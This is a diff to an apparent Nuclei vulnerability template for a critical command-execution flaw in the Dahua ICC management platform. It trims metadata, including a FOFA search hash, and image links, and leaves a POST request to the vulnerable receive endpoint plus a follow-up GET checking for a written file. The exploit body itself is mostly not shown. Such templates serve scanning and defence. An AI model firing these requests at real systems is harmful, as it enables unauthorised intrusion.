@@ -3,12 +3,8 @@ info:
   name: 大华ICC智能物联综合管理平台receive存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pgxddnyeotf81htz'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pgxddnyeotf81htz
-    fofa: icon_hash="-1935899595"
 http:
 - raw:
   - 'POST /evo-runs/v1.0/receive HTTP/1.1
@@ -48,19 +44,14 @@ http:
 
     }
 
-    }
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752547938307-2307f822-6882-4ce8-83c5-8e3f5f5babf2.png)'
+    }'
   redirects: false
   matchers:
   - status:
     - 200
     type: status
 - raw:
-  - 'GET /static/1.txt HTTP/1.1
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752547940993-dce401c1-ff41-461f-a7ec-099e02f39a4b.png)'
+  - GET /static/1.txt HTTP/1.1
   redirects: false
   matchers:
   - status:
